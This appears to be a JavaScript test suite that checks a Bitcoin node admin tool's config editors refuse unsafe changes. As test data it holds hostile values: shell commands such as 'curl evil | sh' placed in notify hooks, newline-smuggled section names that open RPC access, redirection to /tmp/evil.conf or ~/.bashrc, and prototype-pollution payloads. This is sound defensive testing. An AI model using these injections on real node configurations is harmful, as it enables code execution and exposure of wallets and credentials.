// THE CONFIG EDITORS, HARDENED (review of 2026-09-19; docs/PLAN-ADMIN-SUITE.md §7).
//
// The first cut of the editors did what it was asked, which for a config editor is the
// problem: asked to write the bytes `\n[main]\nrpcallowip=0.0.0.0/0` as a section name it
// wrote them, asked to point a node's confFile at ~/.bashrc it would have edited that, and
// asked to set `server.trustProxy` in BlockYard's own file it switched off the HTTPS gate.
// Each test here pins one refusal the review found missing, and was written failing first.
//
// Operator decisions quoted where a test enforces one (2026-09-19):
//   (1) "The web config editor may NOT touch RPC credentials or binding, and may not
//       redirect which file it writes."
//   (4) "BlockYard's own config editor edits only an ALLOWLIST of display and polling
//       settings; everything else is locked like the admin block."
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { withApp } from './helpers/http.js';
import { __resetElevations } from '../server/admin/elevation.js';
import { loadConfig } from '../server/config.js';
import {
  parseConf, renderConf, applyChanges, confSettings, REFUSED_KEYS, SELF_EDITABLE, ownershipProblem,
} from '../server/admin/config-edit.js';

const SAMPLE = [
  '# a node someone actually configured',
  'server=1',
  'txindex=1',
  'rpcuser=alice',
  'rpcpassword=hunter2-the-real-one',
  'rpcauth=bob:0123abcd$feedface',
  '',
  'maxconnections = 40',
  '[main]',
  'rpcport=8332',
  'dbcache=4096',
  '',
].join('\n');

const ADMIN = { enabled: true, allowInsecure: true, wallets: [], elevationMs: 60_000, spend: { capSat: 1000 } };

async function ready(fn, { conf = SAMPLE, before = null } = {}) {
  __resetElevations();
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'blockyard-conf-hard-'));
  const file = path.join(dir, 'bitcoin.conf');
  fs.writeFileSync(file, conf);
  if (before) before({ dir, file });
  try {
    return await withApp({ nodes: 1, config: { admin: ADMIN } }, async (h) => {
      const node = [...h.app.monitors.values()][0];
      node.cfg.datadir = dir;
      const s = await h.client.login('admin', h.client.adminPassword);
      await h.client.post('/api/admin/elevate', { password: h.client.adminPassword }, { csrf: s.csrf });
      return fn({ ...h, csrf: s.csrf, dir, file, node });
    });
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
}

const post = (client, csrf, body) => client.post('/api/admin/config/node', body, { csrf });

// ------------------------------------------------ H2: the section is a line of the file

test('a section name is one of the five networks, never text that becomes lines', () => {
  const entries = parseConf(SAMPLE);
  for (const section of ['main]\nrpcallowip=0.0.0.0/0\n[main', 'mainnet', 'x', 5, {}, ['main']]) {
    assert.throws(() => applyChanges(entries, [{ key: 'dbcache', value: '1', section }]),
      (err) => err.code === 'section-invalid', `section ${JSON.stringify(section)} must be refused`);
  }
  for (const section of ['main', 'test', 'testnet4', 'signet', 'regtest', null, undefined]) {
    applyChanges(entries, [{ key: 'dbcache', value: '1', section }]);
  }
});

// -------------------------------------- decision (1) / H3: keys the web may not touch

test('RPC credentials, binding and file redirection are refused outright, in every spelling', () => {
  const entries = parseConf(SAMPLE);
  const spellings = [
    { key: 'rpcallowip', value: '0.0.0.0/0' },
    { key: 'main.rpcallowip', value: '0.0.0.0/0' },          // section-qualified
    { key: 'rpcallowip', value: '0.0.0.0/0', section: 'main' },
    { key: 'norpcallowip', value: '1' },                     // the negated form
    { key: 'rpcpassword', remove: true },                    // removing is changing
    { key: 'rpcauth', value: 'x:y$z' },
    { key: 'includeconf', value: '/tmp/evil.conf' },
    { key: 'datadir', value: '/tmp' },
    { key: 'zmqpubrawtx', value: 'tcp://0.0.0.0:28333' },    // any zmqpub*
    { key: 'signet.zmqpubhashblock', value: 'tcp://0.0.0.0:1' },
    { key: 'server', value: '0' },
    { key: 'regtest', value: '1' },
    // Not on the operator's list, and refused for the same reason and a worse one:
    // these run a shell command as the node's user, which is code execution by config.
    { key: 'blocknotify', value: 'curl evil | sh' },
    { key: 'walletnotify', value: 'sh -c id' },
  ];
  for (const change of spellings) {
    assert.throws(() => applyChanges(entries, [change]),
      (err) => err.code === 'key-refused' && /by hand/.test(err.message),
      `${JSON.stringify(change)} must be refused, not acknowledged`);
  }
  for (const k of ['rpcauth', 'rpcuser', 'rpcpassword', 'rpcbind', 'rpcallowip', 'rpcport', 'rpccookiefile',
    'rpccookieperms', 'rpcwhitelist', 'rpcwhitelistdefault', 'server', 'rest', 'includeconf', 'conf', 'datadir',
    'walletdir', 'blocksdir', 'whitebind', 'whitelist', 'chain', 'testnet', 'testnet4', 'regtest', 'signet',
    'signetchallenge', 'signetseednode']) {
    assert.ok(REFUSED_KEYS.has(k), `${k} is on the operator's list of 2026-09-19`);
  }
});

test('the refusal happens over the route too, and names why', async () => {
  await ready(async ({ client, csrf, file }) => {
    const res = await post(client, csrf, { changes: [{ key: 'main.rpcallowip', value: '0.0.0.0/0' }], acknowledge: ['rpcallowip', 'main.rpcallowip'] });
    assert.equal(res.status, 403, JSON.stringify(res.body));
    assert.equal(res.body.error.code, 'key-refused');
    assert.match(res.body.error.message, /by hand on the machine/);
    assert.ok(!fs.readFileSync(file, 'utf8').includes('0.0.0.0/0'));
  });
});

test('acknowledgement is a list of exact names, not a string to search in', async () => {
  await ready(async ({ client, csrf, file }) => {
    // "rpcbind" contains "bind"; a substring test would let it acknowledge bind.
    let res = await post(client, csrf, { changes: [{ key: 'bind', value: '0.0.0.0' }], acknowledge: 'rpcbind' });
    assert.equal(res.status, 400, JSON.stringify(res.body));
    assert.equal(res.body.error.code, 'acknowledge-invalid');
    res = await post(client, csrf, { changes: [{ key: 'bind', value: '0.0.0.0' }], acknowledge: ['xbind'] });
    assert.equal(res.body.error.code, 'acknowledge-required');
    assert.ok(!fs.readFileSync(file, 'utf8').includes('bind='));
    // The section-qualified and negated forms are weighty as their base key.
    res = await post(client, csrf, { changes: [{ key: 'main.prune', value: '550' }] });
    assert.equal(res.body.error.code, 'acknowledge-required');
    assert.match(res.body.error.message, /prune/);
    res = await post(client, csrf, { changes: [{ key: 'nolisten', value: '1' }] });
    assert.equal(res.body.error.code, 'acknowledge-required');
    res = await post(client, csrf, { changes: [{ key: 'main.prune', value: '550' }], acknowledge: ['prune'] });
    assert.equal(res.status, 200, JSON.stringify(res.body));
  });
});

// --------------------------------------------- H1: which file the node editor writes

test('the node editor writes <datadir>/bitcoin.conf and nothing a confFile points at', async () => {
  const elsewhere = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'blockyard-elsewhere-')), 'bashrc');
  fs.writeFileSync(elsewhere, 'echo hello\n');
  try {
    await ready(async ({ client, csrf, node }) => {
      node.cfg.confFile = elsewhere;
      const res = await post(client, csrf, { changes: [{ key: 'dbcache', value: '1' }] });
      assert.equal(res.status, 409, JSON.stringify(res.body));
      assert.equal(res.body.error.code, 'conf-file-elsewhere');
      assert.match(res.body.error.message, /by hand/);
      assert.equal(fs.readFileSync(elsewhere, 'utf8'), 'echo hello\n', 'the other file is untouched');
      const read = await client.get('/api/admin/config/node');
      assert.equal(read.body.error?.code, 'conf-file-elsewhere', 'nor is it read');
    });
  } finally { fs.rmSync(path.dirname(elsewhere), { recursive: true, force: true }); }
});

test('a bitcoin.conf that is a symlink is refused, and its target is untouched', async () => {
  const outside = fs.mkdtempSync(path.join(os.tmpdir(), 'blockyard-target-'));
  const target = path.join(outside, 'target');
  fs.writeFileSync(target, 'dbcache=4\n');
  try {
    await ready(async ({ client, csrf, file }) => {
      const res = await post(client, csrf, { changes: [{ key: 'dbcache', value: '1' }] });
      assert.equal(res.status, 409, JSON.stringify(res.body));
      assert.equal(res.body.error.code, 'conf-not-regular');
      assert.equal(fs.readFileSync(target, 'utf8'), 'dbcache=4\n');
      assert.ok(fs.lstatSync(file).isSymbolicLink(), 'the link is still a link');
    }, { before: ({ file }) => { fs.rmSync(file); fs.symlinkSync(target, file); } });
  } finally { fs.rmSync(outside, { recursive: true, force: true }); }
});

// ------------------------------------------------- H4: the node must still read it

test('a write keeps the file\'s mode, so a group-readable conf stays group-readable', async () => {
  await ready(async ({ client, csrf, file }) => {
    const res = await post(client, csrf, { changes: [{ key: 'dbcache', value: '1' }] });
    assert.equal(res.status, 200, JSON.stringify(res.body));
    assert.equal(fs.statSync(file).mode & 0o777, 0o640, 'was 0600 whatever the original said');
    assert.equal(fs.statSync(file).uid, process.getuid());
  }, { before: ({ file }) => fs.chmodSync(file, 0o640) });
});

test('ownership that cannot be kept is a refusal before anything is touched', () => {
  const st = { uid: 1001, gid: 1001 };
  assert.match(ownershipProblem(st, { uid: 1000, gids: [1000] }), /owned by uid 1001/);
  assert.equal(ownershipProblem(st, { uid: 0, gids: [0] }), null, 'root can give it back');
  assert.equal(ownershipProblem({ uid: 1000, gid: 1000 }, { uid: 1000, gids: [1000] }), null);
  // Our own file in a group we are not in: chown could not put the group back.
  assert.match(ownershipProblem({ uid: 1000, gid: 1001 }, { uid: 1000, gids: [1000] }), /group 1001/);
  assert.equal(ownershipProblem({ uid: 1000, gid: 1001 }, { uid: 1000, gids: [1000, 1001] }), null);
});

test('a conf that does not exist is not created by the web', async () => {
  await ready(async ({ client, csrf, file }) => {
    const res = await post(client, csrf, { changes: [{ key: 'dbcache', value: '1' }] });
    assert.equal(res.status, 404, JSON.stringify(res.body));
    assert.ok(!fs.existsSync(file));
  }, { before: ({ file }) => fs.rmSync(file) });
});

// -------------------------------------------------- H5: credentials never reach a browser

test('reading the node conf never returns the RPC password or rpcauth', async () => {
  await ready(async ({ client }) => {
    const res = await client.get('/api/admin/config/node');
    assert.equal(res.status, 200, JSON.stringify(res.body));
    const text = JSON.stringify(res.body);
    assert.ok(!text.includes('hunter2'), 'rpcpassword value leaked');
    assert.ok(!text.includes('feedface'), 'rpcauth value leaked');
    assert.equal(res.body.settings.find((s) => s.key === 'rpcpassword').value, '********');
    assert.match(res.body.text, /^rpcpassword=\*{8}$/m);
    assert.match(res.body.text, /^txindex=1$/m, 'everything else reads as written');
  });
});

test('a write\'s diff never carries a credential, even when lines shift under it', async () => {
  await ready(async ({ client, csrf }) => {
    // A new line above the credentials shifts them down, so a positional diff shows them.
    const res = await post(client, csrf, { changes: [{ key: 'maxmempool', value: '500' }] });
    assert.equal(res.status, 200, JSON.stringify(res.body));
    const text = JSON.stringify(res.body);
    assert.ok(!text.includes('hunter2') && !text.includes('feedface'), text);
  });
});

// ------------------------------------------------------ M2, M3 and the byte-for-byte rule

test('a new global setting goes above the first section, where it is still global', () => {
  const { entries } = applyChanges(parseConf(SAMPLE), [{ key: 'maxmempool', value: '500' }]);
  const lines = renderConf(entries).split('\n');
  assert.ok(lines.indexOf('maxmempool=500') < lines.indexOf('[main]'),
    'appended after [main], it would be a mainnet-only setting');
  assert.ok(lines.indexOf('maxmempool=500') > lines.indexOf('maxconnections = 40'), 'after the last global line');
  assert.equal(lines.at(-1), '', 'the trailing newline is kept');
});

test('a key that appears more than once in its scope is left for a person', () => {
  const conf = 'addnode=a.example\naddnode=b.example\n[main]\naddnode=c.example\n';
  assert.throws(() => applyChanges(parseConf(conf), [{ key: 'addnode', value: 'z' }]), /appears 2 times/);
  assert.throws(() => applyChanges(parseConf(conf), [{ key: 'addnode', remove: true }]), /appears 2 times/);
  // once in [main] is once
  const { entries } = applyChanges(parseConf(conf), [{ key: 'addnode', value: 'z', section: 'main' }]);
  assert.match(renderConf(entries), /\[main\]\naddnode=z\n/);
});

test('lines that were not changed are written back exactly as they were', () => {
  const crlf = 'txindex = 1\r\n  maxconnections=40  \r\n[main]\r\ndbcache=4096\r\n';
  const { entries } = applyChanges(parseConf(crlf), [{ key: 'dbcache', value: '1', section: 'main' }]);
  assert.equal(renderConf(entries), 'txindex = 1\r\n  maxconnections=40  \r\n[main]\r\ndbcache=1\r\n');
  assert.equal(renderConf(parseConf(crlf)), crlf, 'and an untouched CRLF file round-trips');
});

test('settings rows are redacted at the source', () => {
  const rows = confSettings(parseConf(SAMPLE));
  assert.equal(rows.find((r) => r.key === 'rpcauth').value, '********');
  assert.equal(rows.find((r) => r.key === 'rpcuser').value, '********');
});

// ------------------------------------------- decision (4): BlockYard's own config

async function self(fn, { seed = null, compact = false } = {}) {
  __resetElevations();
  return withApp({ nodes: 1, config: { admin: ADMIN } }, async (h) => {
    if (seed) {
      const cur = JSON.parse(fs.readFileSync(h.app.configFile, 'utf8'));
      fs.writeFileSync(h.app.configFile, compact ? JSON.stringify(seed(cur)) : JSON.stringify(seed(cur), null, 2));
    }
    const s = await h.client.login('admin', h.client.adminPassword);
    await h.client.post('/api/admin/elevate', { password: h.client.adminPassword }, { csrf: s.csrf });
    return fn({ ...h, csrf: s.csrf });
  });
}

test('only display and polling settings are editable; everything else is refused by name', async () => {
  await self(async ({ client, csrf, app }) => {
    const before = fs.readFileSync(app.configFile, 'utf8');
    for (const [patch, key] of [
      [{ server: { trustProxy: true } }, 'server.trustProxy'],
      [{ server: { allowCidrs: [] } }, 'server.allowCidrs'],
      [{ server: { tls: { enabled: false } } }, 'server.tls.enabled'],
      [{ auth: { enabled: false } }, 'auth.enabled'],
      [{ actions: { enabled: true, allow: ['broadcast'] } }, 'actions.enabled'],
      [{ nodes: [{ id: 'main', confFile: '/home/x/.bashrc' }] }, 'nodes'],
      [{ store: { dir: '/tmp' } }, 'store.dir'],
      [{ store: { auditKeep: 0 } }, 'store.auditKeep'],
      [{ rpc: { maxInFlight: 64 } }, 'rpc.maxInFlight'],
      [{ log: { enabled: true } }, 'log.enabled'],
      [{ server: {} }, 'server'],
      [{ poll: { fastMs: 5000 }, auth: { enabled: false } }, 'auth.enabled'],   // one bad leaf spoils the patch
    ]) {
      const res = await client.post('/api/admin/config/self', { patch }, { csrf });
      assert.equal(res.status, 403, `${JSON.stringify(patch)}: ${JSON.stringify(res.body)}`);
      assert.equal(res.body.error.code, 'setting-locked');
      assert.ok(res.body.error.message.includes(key), `the refusal names ${key}: ${res.body.error.message}`);
    }
    assert.equal(fs.readFileSync(app.configFile, 'utf8'), before, 'nothing was written');
  });
});

test('a value of the wrong type or out of range is refused, not written', async () => {
  await self(async ({ client, csrf }) => {
    for (const patch of [{ poll: { fastMs: 'soon' } }, { poll: { fastMs: 1 } }, { markets: { enabled: 'yes' } },
      { store: { ringCapacity: 1e12 } }, { poll: { fastMs: 1500.5 } }]) {
      const res = await client.post('/api/admin/config/self', { patch }, { csrf });
      assert.equal(res.status, 400, `${JSON.stringify(patch)}: ${JSON.stringify(res.body)}`);
      assert.equal(res.body.error.code, 'value-invalid');
    }
  });
});

test('a write patches the file\'s own settings: siblings survive, defaults are not frozen in', async () => {
  await self(async ({ client, csrf, app }) => {
    const before = JSON.parse(fs.readFileSync(app.configFile, 'utf8'));
    const res = await client.post('/api/admin/config/self', { patch: { poll: { fastMs: 5000 }, markets: { enabled: false } } }, { csrf });
    assert.equal(res.status, 200, JSON.stringify(res.body));
    const after = JSON.parse(fs.readFileSync(app.configFile, 'utf8'));
    assert.equal(after.poll.fastMs, 5000);
    assert.equal(after.poll.midMs, 16000, 'a shallow merge replaced the whole poll block');
    assert.equal(after.markets.enabled, false);
    const raw = fs.readFileSync(app.configFile, 'utf8');
    assert.ok(!raw.includes('********'), 'a redaction placeholder must never be written');
    // Nothing that only exists in the defaults, the env or the boot was copied into the file.
    assert.ok(!('rpc' in after) || 'rpc' in before, 'defaults were frozen into the file');
    assert.ok(!('__configFile' in after));
    assert.deepEqual(after.nodes, before.nodes);
    assert.deepEqual(after.admin, before.admin);
    assert.ok(!JSON.stringify(res.body).includes('node-secret-xyzzy'), 'the diff never carries a node password');
  }, {
    // Compact JSON on disk, so the re-render moves every line and a positional diff would show them all.
    seed: (cur) => ({ ...cur, poll: { midMs: 16000 }, nodes: cur.nodes.map((n) => ({ ...n, rpcPassword: 'node-secret-xyzzy' })) }),
    compact: true,
  });
});

test('the placeholder a read hands out is read back as "unchanged"', async () => {
  await self(async ({ client, csrf, app }) => {
    const before = fs.readFileSync(app.configFile, 'utf8');
    const res = await client.post('/api/admin/config/self', { patch: { poll: { fastMs: '********' } } }, { csrf });
    assert.equal(res.status, 200, JSON.stringify(res.body));
    assert.equal(res.body.unchanged, true);
    assert.equal(fs.readFileSync(app.configFile, 'utf8'), before);
  });
});

test('reading the own config returns only the editable settings, and the locked block', async () => {
  await self(async ({ client }) => {
    const res = await client.get('/api/admin/config/self');
    assert.equal(res.status, 200, JSON.stringify(res.body));
    assert.equal(typeof res.body.editable.poll.fastMs, 'number');
    for (const k of ['nodes', 'server', 'auth', 'actions', 'rpc', 'admin']) {
      assert.ok(!(k in res.body.editable), `${k} is not editable, so it is not in the editable half`);
    }
    assert.ok(res.body.editableKeys.includes('poll.fastMs'));
  });
});

test('prototype keys are refused at any depth of a patch', async () => {
  await self(async ({ client, csrf }) => {
    for (const patch of [JSON.parse('{"__proto__":{"polluted":1}}'), { poll: JSON.parse('{"constructor":{"x":1}}') },
      { markets: { prototype: 1 } }]) {
      const res = await client.post('/api/admin/config/self', { patch }, { csrf });
      assert.equal(res.status, 400, JSON.stringify(res.body));
      assert.equal(res.body.error.code, 'patch-invalid');
    }
    assert.equal({}.polluted, undefined);
  });
});

test('the allowlist names settings that exist, with the types they have', () => {
  // Built from server/config.js DEFAULTS by hand; this stops the two drifting apart.
  const cfg = loadConfig({ configFile: '/nonexistent-local.json' });
  for (const [dotted, rule] of SELF_EDITABLE) {
    const v = dotted.split('.').reduce((o, k) => o?.[k], cfg);
    assert.equal(typeof v, rule.type, `${dotted} is ${typeof v} in the defaults`);
    if (rule.type === 'number') assert.ok(v >= rule.min && v <= rule.max, `${dotted}'s default ${v} is inside its own range`);
  }
  for (const [dotted] of SELF_EDITABLE) {
    assert.ok(!/^(admin|auth|server|actions|nodes|rpc)\b/.test(dotted), `${dotted} is in a locked block`);
    assert.ok(!/dir|file|path|password|secret|cert|key$/i.test(dotted), `${dotted} looks like a path or credential`);
  }
});

// ---------------------------------------------- server/config.js deepMerge

test('a config file cannot set the prototype of the loaded config', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'blockyard-proto-'));
  const f = path.join(dir, 'local.json');
  fs.writeFileSync(f, '{"__proto__":{"polluted":true},"poll":{"__proto__":{"alsoPolluted":true},"fastMs":4000}}');
  try {
    const cfg = loadConfig({ configFile: f });
    assert.equal(cfg.polluted, undefined);
    assert.equal(cfg.poll.alsoPolluted, undefined);
    assert.equal(Object.getPrototypeOf(cfg), Object.prototype);
    assert.equal({}.polluted, undefined);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});
